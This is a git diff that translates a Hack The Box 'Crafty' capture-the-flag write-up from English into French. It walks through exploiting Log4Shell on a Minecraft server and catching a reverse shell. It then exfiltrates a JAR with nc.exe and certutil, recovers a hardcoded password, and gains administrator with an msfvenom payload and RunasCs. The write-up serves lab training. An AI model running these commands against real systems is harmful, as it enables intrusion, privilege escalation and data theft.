@@ -14,7 +14,7 @@ categories = ['Writeups']
 * OS: Windows
 ---
 
-Crafty est un Windows Server 2019 avec Minecraft 1.16.5, cette version est vulnérable à Log4Shell (CVE-2021-44228). Sur Github, nous avons accès à une preuve de concept pour exploiter cette vulnérabilité que nous utilisons pour obtenir un accès initial au système cible. Pour élever nos privilèges, nous utilisons un mot de passe trouvé dans une archive Java pour accéder au compte administrateur.
+Crafty est un Windows Server 2019 avec Minecraft 1.16.5, cette version est vulnérable à Log4Shell (CVE-2021-44228). Sur Github, nous avons accès à une preuve de concept pour exploiter cette vulnérabilité, nous l'utilisons pour obtenir un accès initial au système cible. Pour élever nos privilèges, nous utilisons un mot de passe trouvé dans une archive Java afin d'accéder au compte administrateur.
 
 Addresse IP cible - `10.10.11.249`
 
@@ -45,12 +45,12 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 171.62 seconds
 ```
 
-We find two open ports:
+Notre scan révèle deux ports ouverts:
 
-* 80 running HTTP
-* 25565 running a Minecraft server with version 1.16.5
+* 80 avec HTTP
+* 25565, un serveur minecraft version 1.16.5
 
-Even though there is no redirection let's add `crafty.htb` to our hosts file.
+Bien qu'il n'y ait pas de redirection, ajoutons `crafty.htb` à notre fichier hosts pour faciliter l'énumération.
 
 ```
 sudo echo "10.10.11.249 crafty.htb" | sudo tee -a /etc/hosts
@@ -58,47 +58,43 @@ sudo echo "10.10.11.249 crafty.htb" | sudo tee -a /etc/hosts
 
 ## Enumération
 
-When we go to the website we find a web page about a game called Crafty.
+Lorsque nous nous rendons sur le site web, nous trouvons une page web pour un jeu appelé Crafty.
 
 ![Crafty website](/images/HTB-Crafty/crafty-webpage.png)
 
-There is nothing interesting on the web application so far. I turned my attention to the Minecraft server. When searching `minecraft 1.16.5 vulnerability` we find that there is a Log4j exploit for it with [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228).
+Nous n'avons aucun moyen d'interagir avec l'application web, nous tournons donc notre attention vers le serveur Minecraft. En recherchant `minecraft 1.16.5 vulnerability`, nous découvrons Log4j avec le [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228).
 
-> `play.crafty.htb` redirects us to the main website.
+> `play.crafty.htb` nous redirige vers `crafty.htb`.
 
 ![Minecraft Log4j exploit](/images/HTB-Crafty/log4j-Minecraft.png)
 
-We then find a PoC for the exploit at this [Github repo](https://github.com/kozmer/log4j-shell-poc?source=post_page-----316a735a306d--------------------------------).
+Nous trouvons ensuite une preuve de concept sur ce [repo Github](https://github.com/kozmer/log4j-shell-poc?source=post_page-----316a735a306d--------------------------------).
 
-After checking the content of `poc.py` we notice that it is using `String cmd="/bin/sh";` which will not work on Windows. In order to make it Windows compatible we change that line to `String cmd="cmd.exe";`.
+Après inspection du contenu de `poc.py`, nous remarquons qu'il utilise `String cmd="/bin/sh";` ce qui ne fonctionnera pas sous Windows. Afin de le rendre compatible avec Windows, nous changeons cette ligne en `String cmd="cmd.exe";`.
 
 ![Log4j PoC content](/images/HTB-Crafty/log4j-poc-content.png)
 
 ![Log4j PoC content change](/images/HTB-Crafty/poc-python-change.png)
 
-On the exploit page, we read: "**Note:** For this to work, the extracted java archive has to be named: `jdk1.8.0_20`, and be in the same directory."
+Sur la page Github, nous lisons: "**Note:** For this to work, the extracted java archive has to be named: `jdk1.8.0_20`, and be in the same directory."
 
-Going to the website provided on the Github page we are required to create an account. After searching around we found some java archives on https://repo.huaweicloud.com/java/.
-
-For a quick download and setup use the commands below.
+En allant sur le site web indiqué sur la page Github, il nous est demandé de créer un compte. Après quelques recherches, nous trouvons des archives java sur https://repo.huaweicloud.com/java/.
 
 ```
-#Make sure to download it in the log4j-shell-poc directory
+#Veillez à télécharger l'archive dans le dossier log4j-shell-poc.
 wget https://repo.huaweicloud.com/java/jdk/8u181-b13/jdk-8u181-linux-x64.tar.gz
 
 tar -xf jdk-8u181-linux-x64.tar.gz
 
-#Rename the file
+#Renommez le fichier
 mv jdk1.8.0_181 jdk1.8.0_20
 ```
 
 ## Accès initial
 
-Here are all our files.
-
 ![Log4j PoC files](/images/HTB-Crafty/log4j-poc-files.png)
 
-We need a way to communicate with the Minecraft server, we will use [pyCraft](https://github.com/ammaraskar/pyCraft) for that. Let's setup a virtual environment for pyCraft.
+Nous avons besoin d'un moyen de communiquer avec le serveur Minecraft, nous utiliserons [pyCraft](https://github.com/ammaraskar/pyCraft). Configurons un environnement virtuel pour pyCraft.
 
 ```
 virtualenv ENV
@@ -110,13 +106,13 @@ pip install -r requirements.txt
 
 ![PyCraft setup](/images/HTB-Crafty/pyCraft-setup.png)
 
-Now we setup a listener to catch the shell.
+Nous avons également besoin d'un listener netcat
 
 ```
 rlwrap nc -lvnp 4444
 ```
 
-Then we start the log4j exploit from the `log4j-shell-poc` directory.
+Ensuite, nous lançons l'exploit log4j à partir du répertoire `log4j-shell-poc`.
 
 ```
 python3 poc.py --userip <IP_ADDRESS> --webport 80 --lport <PORT_NUMBER>
@@ -124,51 +120,43 @@ python3 poc.py --userip <IP_ADDRESS> --webport 80 --lport <PORT_NUMBER>
 
 ![Log4j exploit launch](/images/HTB-Crafty/crafty-exploit.png)
 
-From the `PyCraft` folder we run `start.py`
+Depuis le dossier `PyCraft` nous exécutons `start.py`
 
 ```
-virtualenv ENV
-
-source ENV/bin/activate
-
-pip install -r requirements.txt
-
 python3 start.py
 ```
 
-After the `Connected.` message appears in PyCraft. We copy the link provided on the line starting with `Send me:` in `log4j-shell-poc`, paste it in pyCraft then press `Enter` and we catch a shell on the listener.
+Après s'être connecté au serveur, nous copions le lien généré par `log4j-shell-poc` (sur la ligne commençant par `[+] Send me:`), nous le collons dans pyCraft puis nous appuyons sur `Enter` pour obtenir une connexion sur le listener.
 
 ![PyCraft](/images/HTB-Crafty/PyCraft-connection-link.png)
 
-> If PyCraft fails to connect to the server, resetting the box should solve the issue.
+> Si PyCraft ne parvient pas à se connecter au serveur, réinitialiser la box sur HackTheBox devrait résoudre le problème.
 
 ![svc_minecraft shell](/images/HTB-Crafty/shell-minecraft.png)
 
-The user flag is on the user desktop.
+Nous trouvons `user.txt` sur le bureau de l'utilisateur.
 
 ![Crafty user flag](/images/HTB-Crafty/crafty-user-flag.png)
 
 ## Elévation de Privilèges
 
-In `c:\Users\svc_minecraft\server\plugins\` we find an archive named `playercounter-1.0-SNAPSHOT.jar`.
+Une archive nommée `playercounter-1.0-SNAPSHOT.jar` est trouvée dans `c:\Users\svc_minecraft\server\plugins\`.
 
-To send that file to our local machine we used `nc.exe` (Netcat for Windows)
+Pour exfiltrer le fichier vers notre machine locale, nous utilisons `nc.exe` (Netcat pour Windows).
 
-1. Download `nc.exe` with 
+1. Téléchargez `nc.exe` avec 
 
 ```
 wget https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip
 ```
 
-2. Move into the `netcat-1.11` directory created after the extraction
-
-3. Start a Python server
+2. Démarrez un serveur web avec Python dans le répertoire `netcat-1.11`.
 
 ```
 python3 -m http.server
 ```
 
-4. We download `nc.exe` on the target
+3. Envoyez `nc.exe` sur le système cible
 
 ```
 certutil.exe -urlcache -split -f http://IP:PORT/nc.exe nc.exe
@@ -176,13 +164,13 @@ certutil.exe -urlcache -split -f http://IP:PORT/nc.exe nc.exe
 
 ![netcat upload on target](/images/HTB-Crafty/nc.exe-ontarget.png)
 
-5. On our local machine we run
+4. Sur notre machine locale, nous exécutons
 
 ```
 nc -nlp 1235 > playercounter-1.0-SNAPSHOT.jar
 ```
 
-6. Finally, we send the archive to our Kali machine 
+5. Enfin, nous envoyons l'archive à notre machine Kali 
 
 ```
 .\nc.exe 10.10.14.222 1235 < c:\Users\svc_minecraft\server\plugins\playercounter-1.0-SNAPSHOT.jar
@@ -190,19 +178,19 @@ nc -nlp 1235 > playercounter-1.0-SNAPSHOT.jar
 
 ![Crafty archive exfiltration](/images/HTB-Crafty/archive-exfiltration.png)
 
-> Stop the listener to regain control of the terminal on the target system.
+> Pour reprendre le contrôle du terminal sur le système cible, arrêtez le listener
 
-After extracting the archive, we get `Playercounter.class` in `/htb/crafty/playercounter/`which we decompile with [decompiler.com](https://www.decompiler.com/).
+Après avoir extrait l'archive, nous obtenons `Playercounter.class` dans `/htb/crafty/playercounter/` que nous décompilons avec [decompiler.com](https://www.decompiler.com/).
 
-> A `.class` file is a compiled Java bytecode file. When you compile a Java source code file (`.java`), the Java compiler (`javac`) translates the human-readable Java code into a platform-independent bytecode format. This bytecode is then stored in `.class` files. In our case `Playercounter.class` contains the compiled bytecode for the `Playercounter` Java class.
+> Pour en savoir plus sur les fichiers .class, cliquez [ici](https://www.online-convert.com/fr/format-fichier/class)
 
-We find what looks like some credential (`s67u84zKq8IXw`) used when connecting to a service on port 27015 (typically used by online games). 
+Nous trouvons ce qui ressemble à un mot de passe (`s67u84zKq8IXw`) utilisé lors de la connexion à un service sur le port 27015 (typiquement utilisé par les jeux en ligne). 
 
 ![archive content credentials](/images/HTB-Crafty/playercount-file.png)
 
-We have a tool called [RunasCs](https://github.com/antonioCoco/RunasCs) that enables us to execute processes with permissions different from our current user's. Our objective is to launch an Administrator shell from the current user `svc_minecraft`.
+Nous disposons d'un outil appelé [RunasCs](https://github.com/antonioCoco/RunasCs) qui nous permet d'exécuter des processus avec des permissions différentes de celles de notre utilisateur actuel. Notre objectif est d'obtenir l'accès au compte `Administrator` à partir de l'utilisateur actuel `svc_minecraft`.
 
-Let's generate a payload with `msfvenom`.
+Créons un payload avec `msfvenom`.
 
 **Example**
 
@@ -210,35 +198,36 @@ Let's generate a payload with `msfvenom`.
 msfvenom -p windows/x64/shell_reverse_tcp lhost=<YOUR IP ADDRESS> lport=<PORT NUMBER> -f exe -a x64 --platform windows -o shell.exe
 ```
 
-`shell.exe` and `RunasCs.exe` are transferred to the target using the same method employed for `nc.exe`.
+Les fichiers `shell.exe` et `RunasCs.exe` sont transférés à la cible en utilisant la même méthode que celle employée pour `nc.exe`.
 
 ![malicious file and runascs.exe on target](/images/HTB-Crafty/files-on-target.png)
 
-We setup another listener on the port selected for your `msfvenom` payload.
+Nous mettons en place un autre listener sur le port sélectionné pour le payload.
 
 ```
 rlwrap -cAr nc -lvp <PORT_NUMBER>
 ```
 
-We then use `runasCs` in conjunction with the payload.
+Nous utilisons ensuite `runasCs` en conjonction avec le fichier malveillant.
 
 ```
 .\runasCs.exe administrator s67u84zKq8IXw shell.exe --bypass-uac
 ```
 
-We get a connection on the listener, as `administrator`.
+Et finalement nous obtenons une connexion sur le listener, en tant que `administrator`.
 
 ![admin shell](/images/HTB-Crafty/admin-shell.png)
 
-At `C:\Users\Administrator\Desktop` we find `root.txt`.
+Dans `C:\Users\Administrator\Desktop` nous trouvons `root.txt`.
 
 ![root flag](/images/HTB-Crafty/root-flag.png)
 
-The Log4j vulnerability is pretty popular because it allows attackers to easily take full control of vulnerable systems. If you want to read more about it, here are a couple of articles:
+## Mots de Fin
 
-* [Log4J Vulnerability Explained: What It Is and How to Fix It](https://builtin.com/articles/log4j-vulerability-explained)
-* [Log4j vulnerability - what everyone needs to know](https://www.ncsc.gov.uk/information/log4j-vulnerability-what-everyone-needs-to-know)
+Log4j est considéré comme l'une des vulnérabilités les plus critiques, car elle permet aux attaquants de facilement prendre le contrôle de systèmes vulnérables. Il est très important d'être capable de reconnaître et de tester les vulnérabilités les plus populaires. Vous trouverez ci-dessous une vidéo et un article détaillant Log4j.
 
+* [Log4J | Log4shell : c'est quoi cette vulnérabilité en deux mots ? | Vulnérabilité Log4J](https://www.youtube.com/watch?v=U6V5ok-O4ec&ab_channel=Techno)
+* [Qu’est-ce que la vulnérabilité Apache Log4J (Log4Shell) ?](https://www.trendmicro.com/fr_fr/what-is/apache-log4j-vulnerability.html)
 
 
 
